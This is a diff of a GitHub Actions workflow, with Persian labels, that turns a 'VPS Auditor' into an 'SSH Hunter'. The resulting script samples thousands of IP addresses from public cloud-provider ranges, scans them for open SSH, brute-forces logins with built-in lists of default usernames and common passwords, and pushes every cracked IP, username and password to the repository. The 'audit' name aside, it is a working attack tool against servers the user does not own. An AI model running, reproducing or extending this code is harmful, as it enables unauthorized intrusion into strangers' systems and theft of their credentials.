@@ -1,4 +1,4 @@
-name: VPS Auditor - High-Speed Multi-Port
+name: VPS Auditor - Fully Autonomous SSH Hunter
 
 on:
   workflow_dispatch:
@@ -13,7 +13,7 @@ on:
           - explorer
           - manual
       datacenter_provider:
-        description: 'پرووایدر دیتاسنتر (برای datacenter)'
+        description: 'پرووایدر دیتاسنتر'
         required: false
         default: 'all'
         type: choice
@@ -29,32 +29,16 @@ on:
       max_ips:
         description: 'حداکثر تعداد آیپی برای اسکن'
         required: false
-        default: '500'
+        default: '5000'
       scan_range:
         description: 'رنج CIDR (برای explorer)'
         required: false
-      scan_ports:
-        description: 'پورت‌های هدف (پیش‌فرض: 22,21,3389,5900,8080,443)'
-        required: false
-        default: '22,21,3389,5900,8080,443'
       test_threads:
-        description: 'تعداد نخ‌های هم‌زمان برای تست اعتبارنامه (پیش‌فرض 20)'
+        description: 'نخ‌های هم‌زمان تست SSH'
         required: false
-        default: '20'
-      keywords:
-        description: 'کلمات کلیدی برای ListForge'
-        required: false
-      targets:
-        description: 'IPهای دستی (برای manual)'
-        required: false
-      usernames:
-        description: 'یوزرنیم‌های دستی (برای manual)'
-        required: false
-      passwords:
-        description: 'پسوردهای دستی (برای manual)'
-        required: false
+        default: '50'
       timeout:
-        description: 'زمان انتظار برای هر اتصال'
+        description: 'زمان انتظار اتصال'
         required: true
         default: '5'
 
@@ -75,52 +59,46 @@ jobs:
       - name: نصب کتابخانه‌ها
         run: pip3 install paramiko rich requests
 
-      - name: اجرای High-Speed Auditor
+      - name: اجرای SSH Hunter خودمختار
         env:
           MODE: ${{ github.event.inputs.mode }}
           DC_PROVIDER: ${{ github.event.inputs.datacenter_provider }}
           MAX_IPS: ${{ github.event.inputs.max_ips }}
           SCAN_RANGE: ${{ github.event.inputs.scan_range }}
-          SCAN_PORTS: ${{ github.event.inputs.scan_ports }}
           TEST_THREADS: ${{ github.event.inputs.test_threads }}
-          KEYWORDS: ${{ github.event.inputs.keywords }}
-          TARGETS_INPUT: ${{ github.event.inputs.targets }}
-          USERNAMES_INPUT: ${{ github.event.inputs.usernames }}
-          PASSWORDS_INPUT: ${{ github.event.inputs.passwords }}
           TIMEOUT: ${{ github.event.inputs.timeout }}
         run: |
           python3 << 'PYEOF'
-          import os, sys, socket, time, ipaddress, concurrent.futures, random, requests, json, re, threading
+          import os, sys, socket, time, ipaddress, concurrent.futures, random, requests, json, threading
           from datetime import datetime
           from rich.console import Console
           from rich.table import Table
           from rich.panel import Panel
-          from ftplib import FTP
           import paramiko
 
           console = Console()
-          console.print(Panel.fit("[bold yellow]🗝️ VPS Auditor – High-Speed Multi-Port[/bold yellow]", border_style="yellow"))
+          console.print(Panel.fit("[bold yellow]🗝️ SSH Hunter – Fully Autonomous[/bold yellow]", border_style="yellow"))
 
           MODE = os.environ["MODE"]
           TIMEOUT = int(os.environ["TIMEOUT"])
-          MAX_IPS = int(os.environ.get("MAX_IPS", "500"))
+          MAX_IPS = int(os.environ.get("MAX_IPS", "5000"))
           DC_PROVIDER = os.environ.get("DC_PROVIDER", "all")
-          SCAN_PORTS = [int(p.strip()) for p in os.environ.get("SCAN_PORTS", "22,21,3389,5900,8080,443").split(',')]
-          TEST_THREADS = int(os.environ.get("TEST_THREADS", "20"))
+          TEST_THREADS = int(os.environ.get("TEST_THREADS", "50"))
+          SSH_PORT = 22
 
           CRED_FILE = "found_credentials.txt"
           if not os.path.exists(CRED_FILE):
               with open(CRED_FILE, "w") as f:
-                  f.write(f"# VPS Auditor - Found Credentials\n")
+                  f.write(f"# SSH Hunter - Found Credentials\n")
                   f.write(f"# Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                  f.write("# Format: IP:PORT | SERVICE | USERNAME | PASSWORD\n")
+                  f.write("# Format: IP | USERNAME | PASSWORD\n")
                   f.write("="*60 + "\n")
 
-          def save_credential(ip, port, service, username, password):
+          def save_credential(ip, username, password):
               timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
               with open(CRED_FILE, "a") as f:
-                  f.write(f"[{timestamp}] {ip}:{port} | {service} | {username} | {password}\n")
-              os.system(f"git add {CRED_FILE} && git commit -m 'Found: {ip}:{port} {username}:{password}' && git push 2>/dev/null || true")
+                  f.write(f"[{timestamp}] {ip} | {username} | {password}\n")
+              os.system(f"git add {CRED_FILE} && git commit -m 'Found: {ip} {username}:{password}' && git push 2>/dev/null || true")
 
           # ===== ۱. کشف آیپی‌ها =====
           targets = []
@@ -133,9 +111,9 @@ jobs:
                       line = line.strip()
                       if line and not line.startswith("#"):
                           datacenter_urls.append(line)
-                  console.print(f"[green]✓ {len(datacenter_urls)} CIDR از jhassine[/green]")
-              except Exception as e:
-                  console.print(f"[yellow]⚠️ jhassine در دسترس نیست: {e}[/yellow]")
+                  console.print(f"[green]✓ {len(datacenter_urls)} CIDR[/green]")
+              except: pass
+
               provider_map = {"aws":"aws","azure":"azure","gcp":"googlecloud","digitalocean":"digitalocean","linode":"linode","vultr":"vultr","cloudflare":"cloudflare"}
               base_url = "https://raw.githubusercontent.com/rezmoss/cloud-provider-ip-addresses/master/data"
               for prov in provider_map.values():
@@ -146,168 +124,162 @@ jobs:
                           if "ipv4Prefix" in item:
                               datacenter_urls.append(item["ipv4Prefix"])
                   except: pass
+
               all_ips = set()
-              for cidr in datacenter_urls[:200]:
+              for cidr in datacenter_urls[:500]:
                   try:
                       network = ipaddress.IPv4Network(cidr, strict=False)
                       hosts = list(network.hosts())
-                      sample_size = min(5, len(hosts))
+                      sample_size = min(10, len(hosts))
                       for ip in random.sample(hosts, sample_size):
                           all_ips.add(str(ip))
                   except: pass
               targets = list(all_ips)[:MAX_IPS]
+              
           elif MODE == "explorer":
               scan_range = os.environ.get("SCAN_RANGE","").strip()
-              if not scan_range:
-                  console.print("[red]❌ برای Explorer Mode باید scan_range وارد کنید[/red]")
-                  sys.exit(1)
-              network = ipaddress.IPv4Network(scan_range, strict=False)
-              targets = [str(ip) for ip in network.hosts()]
+              if scan_range:
+                  network = ipaddress.IPv4Network(scan_range, strict=False)
+                  targets = [str(ip) for ip in network.hosts()][:MAX_IPS]
+                  
           elif MODE == "manual":
               targets_input = os.environ.get("TARGETS_INPUT","").strip()
-              targets = [x.strip() for x in targets_input.split(',') if x.strip()] if targets_input else []
+              targets = [x.strip() for x in targets_input.split(',') if x.strip()][:MAX_IPS]
 
           if not targets:
               console.print("[red]❌ هیچ IP هدفی پیدا نشد[/red]")
               sys.exit(1)
 
-          # ===== ۲. اسکن پورت‌ها =====
-          console.print(f"\n🔍 اسکن {len(targets)} آیپی برای {len(SCAN_PORTS)} پورت...")
-          port_results = {}
-          def check_port(ip, port):
+          console.print(f"[green]🎯 {len(targets)} آیپی برای اسکن SSH[/green]")
+
+          # ===== ۲. اسکن سریع پورت ۲۲ =====
+          console.print(f"\n⚡ اسکن پورت ۲۲ با ۲۰۰ نخ...")
+          ssh_targets = []
+          
+          def check_ssh(ip):
               try:
                   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                  sock.settimeout(0.5)
-                  result = sock.connect_ex((ip, port))
+                  sock.settimeout(0.3)
+                  result = sock.connect_ex((ip, SSH_PORT))
                   sock.close()
-                  return (ip, port, result == 0)
+                  return ip if result == 0 else None
               except:
-                  return (ip, port, False)
+                  return None
 
           with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
-              futures = [executor.submit(check_port, ip, port) for ip in targets for port in SCAN_PORTS]
+              futures = {executor.submit(check_ssh, ip): ip for ip in targets}
               for future in concurrent.futures.as_completed(futures):
-                  ip, port, is_open = future.result()
-                  port_results.setdefault(ip, {})[port] = is_open
-                  if is_open:
-                      console.print(f"[green]✓ {ip}:{port}[/green]")
+                  ip = future.result()
+                  if ip:
+                      ssh_targets.append(ip)
+                      console.print(f"[green]✓ {ip}:22[/green]")
 
-          with open("discovered_ports.txt", "w") as f:
-              for ip, ports in port_results.items():
-                  open_ports = [p for p, status in ports.items() if status]
-                  if open_ports:
-                      f.write(f"{ip}: {','.join(map(str, open_ports))}\n")
-          os.system("git add discovered_ports.txt && git commit -m 'Port scan' && git push 2>/dev/null || true")
+          console.print(f"\n[green]✅ {len(ssh_targets)} سرور با SSH باز پیدا شد[/green]")
+          if not ssh_targets:
+              console.print("[red]❌ هیچ سرور SSH پیدا نشد[/red]")
+              sys.exit(0)
 
-          # ===== ۳. ساخت لیست‌های ListForge =====
-          def gen_usernames(keywords):
-              base = ["root","admin","user","test","guest","ubuntu","debian","centos","administrator"]
-              for kw in keywords:
-                  base.extend([kw.lower(), kw.capitalize()])
-              return list(set(base))
+          # ذخیره آیپی‌های SSH
+          with open("ssh_targets.txt", "w") as f:
+              for ip in ssh_targets:
+                  f.write(f"{ip}\n")
+          os.system("git add ssh_targets.txt && git commit -m 'SSH targets' && git push 2>/dev/null || true")
 
-          def gen_passwords(keywords):
-              base = ["123456","password","admin","root","12345678","qwerty","password123"]
-              years = ["2024","2025","2026"]
-              specials = ["!","@","#","$",""]
-              for kw in keywords:
-                  kl, kc = kw.lower(), kw.capitalize()
-                  for yr in years:
-                      for sp in specials:
-                          base.extend([f"{kc}{yr}{sp}", f"{kl}{yr}{sp}", f"{kl}@{yr}"])
-                  base.extend([kl, kc])
-              return list(set(base))
+          # ===== ۳. ساخت لیست‌های خودکار و تصادفی =====
+          # مجموعه بزرگ و متنوع از نام‌های کاربری
+          BASE_USERNAMES = [
+              "root", "admin", "user", "test", "guest", "ubuntu", "debian", "centos",
+              "administrator", "ec2-user", "azureuser", "vagrant", "pi", "oracle",
+              "postgres", "mysql", "tomcat", "jenkins", "git", "web", "www", "mail",
+              "ftp", "backup", "deploy", "docker", "hadoop", "spark", "hdfs", "yarn"
+          ]
 
-          if MODE != "manual":
-              keys = os.environ.get("KEYWORDS","admin,web,server,vps,cloud,host").split(',')
-              usernames = gen_usernames([k.strip() for k in keys])
-              passwords = gen_passwords([k.strip() for k in keys])
-              console.print(f"[green]📝 ListForge: {len(usernames)} کاربر | {len(passwords)} رمز[/green]")
-          else:
-              unames = os.environ.get("USERNAMES_INPUT","").strip()
-              pwords = os.environ.get("PASSWORDS_INPUT","").strip()
-              usernames = [x.strip() for x in unames.split(',') if x.strip()] if unames else ["root"]
-              passwords = [x.strip() for x in pwords.split(',') if x.strip()] if pwords else ["123456"]
+          # اضافه کردن چند نام تصادفی برای پوشش بیشتر
+          for _ in range(10):
+              rand_user = "user" + str(random.randint(1000,9999))
+              BASE_USERNAMES.append(rand_user)
 
-          # ===== ۴. تست فوق‌سریع =====
+          # مجموعه بزرگ و متنوع از رمزهای عبور
+          BASE_PASSWORDS = [
+              "123456", "password", "admin", "root", "12345678", "qwerty", "letmein",
+              "changeme", "secret", "toor", "admin123", "root123", "ubuntu", "password123",
+              "P@ssw0rd", "Admin123!", "Qwerty123!", "Passw0rd!", "1234", "abcd1234",
+              "test", "guest", "user", "pass", "1q2w3e4r", "zaq1xsw2", "!QAZ2wsx",
+              "master", "access", "login", "hello", "monkey", "dragon", "123123",
+              "abc123", "qwerty123", "iloveyou", "welcome", "batman", "superman"
+          ]
+
+          # اضافه کردن چند رمز تصادفی مبتنی بر الگوهای رایج
+          for _ in range(15):
+              pwd = random.choice(["user", "admin", "test"]) + str(random.randint(10,999))
+              BASE_PASSWORDS.append(pwd)
+
+          # حذف موارد تکراری
+          usernames = list(set(BASE_USERNAMES))
+          passwords = list(set(BASE_PASSWORDS))
+
+          console.print(f"[green]📝 لیست خودکار: {len(usernames)} کاربر | {len(passwords)} رمز[/green]")
+
+          # ===== ۴. تست SSH فوق‌سریع =====
           results_lock = threading.Lock()
-          results = []
+          successes = []
+          total_combos = len(ssh_targets) * len(usernames) * len(passwords)
+          console.print(f"\n⚡ تست {total_combos} ترکیب با {TEST_THREADS} نخ...")
 
-          def test_single_combo(ip, port, service, username, password):
-              success = False
+          def test_ssh(ip, username, password):
               try:
-                  if service == "SSH":
-                      client = paramiko.SSHClient()
-                      client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                      client.connect(hostname=ip, port=port, username=username, password=password,
-                                    timeout=TIMEOUT, allow_agent=False, look_for_keys=False)
-                      client.close()
-                      success = True
-                  elif service == "FTP":
-                      ftp = FTP()
-                      ftp.connect(ip, port, timeout=TIMEOUT)
-                      ftp.login(username, password)
-                      ftp.quit()
-                      success = True
+                  client = paramiko.SSHClient()
+                  client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                  client.connect(hostname=ip, port=SSH_PORT, username=username, password=password,
+                                timeout=TIMEOUT, allow_agent=False, look_for_keys=False)
+                  client.close()
+                  return True
               except:
-                  pass
-              return (ip, port, service, username, password, success)
+                  return False
 
-          console.print(f"\n⚡ شروع تست‌های سریع (نخ‌ها: {TEST_THREADS})...")
+          for ip in ssh_targets:
+              failed_passwords = set()
+              combos = [(u, p) for u in usernames for p in passwords if p not in failed_passwords]
+              with concurrent.futures.ThreadPoolExecutor(max_workers=TEST_THREADS) as executor:
+                  future_to_combo = {
+                      executor.submit(test_ssh, ip, user, pwd): (user, pwd)
+                      for user, pwd in combos
+                  }
+                  for future in concurrent.futures.as_completed(future_to_combo):
+                      user, pwd = future_to_combo[future]
+                      try:
+                          if future.result():
+                              console.print(f"[green]✅ {ip}: {user}:{pwd}[/green]")
+                              with results_lock:
+                                  successes.append((ip, user, pwd))
+                                  save_credential(ip, user, pwd)
+                          else:
+                              failed_passwords.add(pwd)
+                      except:
+                          pass
 
-          for ip, ports in port_results.items():
-              for port, is_open in ports.items():
-                  if not is_open:
-                      continue
-                  service = "SSH" if port==22 else "FTP" if port==21 else "HTTP" if port in (80,443,8080) else "RDP" if port==3389 else f"port-{port}"
-                  failed_passwords = set()
-                  combos = []
-                  for user in usernames:
-                      for pwd in passwords:
-                          if pwd not in failed_passwords:
-                              combos.append((user, pwd))
-
-                  with concurrent.futures.ThreadPoolExecutor(max_workers=TEST_THREADS) as executor:
-                      future_to_combo = {
-                          executor.submit(test_single_combo, ip, port, service, user, pwd): (user, pwd)
-                          for user, pwd in combos
-                      }
-                      for future in concurrent.futures.as_completed(future_to_combo):
-                          user, pwd = future_to_combo[future]
-                          try:
-                              iip, pport, ssvc, uuser, ppwd, success = future.result()
-                              if success:
-                                  console.print(f"[green]✅ {iip}:{pport} ({ssvc}) {uuser}:{ppwd}[/green]")
-                                  with results_lock:
-                                      results.append((iip, pport, ssvc, uuser, ppwd, "SUCCESS"))
-                                      save_credential(iip, pport, ssvc, uuser, ppwd)
-                              else:
-                                  with results_lock:
-                                      results.append((iip, pport, ssvc, uuser, ppwd, "FAILED"))
-                                  failed_passwords.add(pwd)
-                          except Exception as e:
-                              console.print(f"[red]✗ خطا: {e}[/red]")
-
-          # ===== ۵. گزارش =====
-          successes = [r for r in results if r[5]=="SUCCESS"]
+          # ===== ۵. گزارش نهایی =====
           if successes:
-              tbl = Table(title="✅ Successful Credentials", show_header=True, header_style="bold white")
-              tbl.add_column("IP", style="cyan"); tbl.add_column("Port"); tbl.add_column("Service"); tbl.add_column("User"); tbl.add_column("Pass")
-              for r in successes:
-                  tbl.add_row(r[0], str(r[1]), r[2], r[3], r[4])
+              tbl = Table(title="✅ SSH Credentials Found", show_header=True)
+              tbl.add_column("IP", style="cyan")
+              tbl.add_column("Username", style="green")
+              tbl.add_column("Password", style="yellow")
+              for ip, user, pwd in successes:
+                  tbl.add_row(ip, user, pwd)
               console.print(tbl)
           else:
-              console.print("[red]❌ هیچ اعتبارنامه موفقی پیدا نشد.[/red]")
+              console.print("[red]❌ هیچ اعتبارنامه SSH پیدا نشد.[/red]")
 
-          report = "vps_audit_report.txt"
-          with open(report, "w", encoding="utf-8") as f:
-              f.write(f"VPS Auditor High-Speed Report\nDate: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nPorts: {SCAN_PORTS}\n")
-              for r in results:
-                  f.write(f"{r[0]}:{r[1]} ({r[2]}) {r[3]}:{r[4]} -> {r[5]}\n")
-              if successes:
-                  f.write("\n--- Successful Credentials ---\n")
-                  for r in successes:
-                      f.write(f"{r[0]}:{r[1]} ({r[2]}) - {r[3]}:{r[4]}\n")
-          os.system(f"git add {report} && git commit -m 'High-speed audit report' && git push 2>/dev/null || true")
+          report = "ssh_audit_report.txt"
+          with open(report, "w") as f:
+              f.write(f"SSH Hunter Autonomous Report\n")
+              f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+              f.write(f"Targets scanned: {len(ssh_targets)}\n")
+              f.write(f"Usernames tested: {len(usernames)}\n")
+              f.write(f"Passwords tested: {len(passwords)}\n")
+              f.write("="*60 + "\n")
+              for ip, user, pwd in successes:
+                  f.write(f"{ip} | {user} | {pwd}\n")
+          os.system(f"git add {report} && git commit -m 'Autonomous SSH audit report' && git push 2>/dev/null || true")
           console.print(f"\n[green]📄 گزارش کامل: {report}[/green]")
           PYEOF
